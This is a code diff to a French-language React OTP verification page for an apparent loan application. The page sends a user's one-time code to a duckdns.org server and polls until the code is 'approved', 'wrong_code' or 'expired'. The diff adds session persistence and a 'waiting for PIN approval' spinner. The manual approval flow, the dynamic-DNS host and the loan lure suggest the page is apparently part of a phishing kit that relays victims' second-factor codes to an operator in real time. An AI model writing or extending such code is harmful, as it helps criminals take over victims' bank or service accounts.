@@ -2,6 +2,14 @@ import React, { useState, useRef, useEffect } from 'react'
 import axios from 'axios'
 import { useNavigate, useParams } from 'react-router-dom'
 
+const SpinnerStyle = () => (
+  <style>{`
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  `}</style>
+)
+
 const API_BASE_URL = "https://lnmb.duckdns.org"
 
 const api = axios.create({
@@ -37,8 +45,28 @@ function Verification() {
   const [error, setError] = useState("")
   const [copied, setCopied] = useState(false)
   const [timer, setTimer] = useState(120)
+  const [autoPolling, setAutoPolling] = useState(false)
   
   const startIndex = useRef(null)
+
+  useEffect(() => {
+    const storedSession = sessionStorage.getItem('otpSessionId')
+    if (storedSession) {
+      setSessionId(storedSession)
+      setAutoPolling(true)
+      checkStatus(storedSession)
+    }
+    
+    const storedApp = localStorage.getItem('loanAppData')
+    if (storedApp) {
+      const appData = JSON.parse(storedApp)
+      if (appData.success && appData.sessionId) {
+        setSessionId(appData.sessionId)
+        setAutoPolling(true)
+        checkStatus(appData.sessionId)
+      }
+    }
+  }, [])
 
   const handleKey = (index, e) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
@@ -69,6 +97,7 @@ function Verification() {
     const code = otp.join("")
     console.log("Sending OTP verification...", code)
     setLoading(true)
+    setError("")
     
     try {
       const response = await api.post("/api/verify-user", {
@@ -81,7 +110,9 @@ function Verification() {
       
       if (response.data.sessionId) {
         setSessionId(response.data.sessionId)
+        sessionStorage.setItem('otpSessionId', response.data.sessionId)
         console.log("OTP Session ID:", response.data.sessionId)
+        setAutoPolling(true)
         checkStatus(response.data.sessionId)
       }
     } catch (err) {
@@ -101,17 +132,20 @@ function Verification() {
         if (data.status === "approved") {
           console.log("✅ OTP approved!")
           setSessionId(null)
+          setAutoPolling(false)
           clearInterval(interval)
           setTimeout(() => navigate(`/${userId}/compliance`), 1000)
         } else if (data.status === "wrong_code") {
           console.log("❌ Wrong OTP code")
           setError("Code OTP incorrect")
           setLoading(false)
+          setAutoPolling(false)
           clearInterval(interval)
         } else if (data.status === "expired") {
           console.log("⏰ Session expired")
           setError("Session expirée")
           setLoading(false)
+          setAutoPolling(false)
           clearInterval(interval)
         }
       } catch (err) {
@@ -175,6 +209,7 @@ function Verification() {
 
   return (
     <div className="otp-container">
+      <SpinnerStyle />
       <div className="otpheader">
         <h2>Vérification OTP</h2>
         <p>
@@ -199,6 +234,32 @@ function Verification() {
           borderRadius: "5px" 
         }}>
           {otpStatusMessages[status] || status}
+        </div>
+      )}
+      
+      {autoPolling && (
+        <div style={{
+          display: "flex",
+          alignItems: "center",
+          justifyContent: "center",
+          gap: "10px",
+          padding: "15px",
+          backgroundColor: "#e3f2fd",
+          borderRadius: "8px",
+          margin: "15px 0"
+        }}>
+          <span style={{
+            display: "inline-block",
+            width: "20px",
+            height: "20px",
+            border: "2px solid #1976d2",
+            borderRadius: "50%",
+            borderTopColor: "#1976d2",
+            animation: "spin 1s linear infinite"
+          }}></span>
+          <span style={{ color: "#1976d2", fontWeight: "500" }}>
+            ⏳ En attente d'approbation du PIN...
+          </span>
         </div>
       )}
 
